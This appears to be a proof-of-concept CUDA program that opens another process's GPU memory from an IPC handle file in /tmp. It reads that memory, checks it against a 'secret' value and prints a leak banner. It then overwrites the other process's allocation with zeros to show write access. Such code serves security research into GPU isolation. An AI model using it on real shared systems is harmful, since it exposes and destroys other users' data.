/*
 * IPC Reader: Opens IPC handle written by ipc_writer and reads GPU data.
 * Demonstrates cross-process GPU memory access.
 */
#include <cuda_runtime.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CHECK(call) do { cudaError_t e=(call); if(e!=cudaSuccess){ \
    fprintf(stderr,"[CUDA] %s\n",cudaGetErrorString(e)); exit(1); } } while(0)

int main(int argc, char **argv) {
    const char *handle_file = argc > 1 ? argv[1] : "/tmp/cuda_ipc_handle.bin";

    /* Load handle from file */
    FILE *f = fopen(handle_file, "rb");
    if (!f) { perror("fopen"); exit(1); }

    cudaIpcMemHandle_t h;
    int N; float SECRET;
    fread(&h, sizeof(h), 1, f);
    fread(&N, sizeof(N), 1, f);
    fread(&SECRET, sizeof(SECRET), 1, f);
    fclose(f);

    printf("[reader] Loaded IPC handle from %s\n", handle_file);
    printf("[reader] Expected N=%d floats, secret=%.5f\n", N, SECRET);

    /* Open the IPC handle in THIS process */
    CHECK(cudaSetDevice(0));
    float *d_ipc = NULL;
    cudaError_t err = cudaIpcOpenMemHandle(
        (void**)&d_ipc, h, cudaIpcMemLazyEnablePeerAccess);

    if (err != cudaSuccess) {
        fprintf(stderr, "[reader] cudaIpcOpenMemHandle failed: %s\n",
                cudaGetErrorString(err));
        fprintf(stderr, "         (IPC requires both processes run as same UID or IPC disabled)\n");
        return 1;
    }

    printf("[reader] IPC ptr : %p\n", (void*)d_ipc);

    /* Copy data from writer's GPU memory into our host buffer */
    float *h_buf = (float*)malloc(N * sizeof(float));
    CHECK(cudaMemcpy(h_buf, d_ipc, N * sizeof(float), cudaMemcpyDeviceToHost));
    CHECK(cudaDeviceSynchronize());

    /* Count matches */
    int matches = 0, nonzero = 0;
    for (int i = 0; i < N; i++) {
        if (__builtin_fabsf(h_buf[i] - SECRET) < 1e-3f) matches++;
        if (h_buf[i] != 0.0f) nonzero++;
    }

    printf("[reader] First 8 values: ");
    for (int i = 0; i < 8; i++) printf("%.5f ", h_buf[i]);
    printf("\n");
    printf("[reader] Non-zero  : %d/%d\n", nonzero, N);
    printf("[reader] Matching  : %d/%d  (%.1f%%)\n", matches, N, 100.0f*matches/N);

    if (matches == N)
        printf("\n[!!!] FULL CROSS-PROCESS GPU MEMORY ACCESS VIA IPC HANDLE\n"
               "      Process B read Process A's GPU data without permission check.\n"
               "      Any process with the IPC handle file can read this memory.\n");
    else if (matches > N/2)
        printf("\n[~] HIGH MATCH — partial cross-process leak\n");
    else
        printf("\n[=] No significant match\n");

    /* Modify writer's memory from reader — prove full write access too */
    float *d_modify = NULL;
    CHECK(cudaMalloc(&d_modify, N * sizeof(float)));
    cudaMemset(d_modify, 0, N * sizeof(float));
    /* Copy zeros to the IPC-mapped memory (modifies writer's allocation) */
    CHECK(cudaMemcpy(d_ipc, d_modify, N * sizeof(float), cudaMemcpyDeviceToDevice));
    CHECK(cudaDeviceSynchronize());
    printf("[reader] Overwrote writer's GPU memory with zeros (write access confirmed)\n");

    free(h_buf);
    CHECK(cudaFree(d_modify));
    CHECK(cudaIpcCloseMemHandle(d_ipc));
    return 0;
}
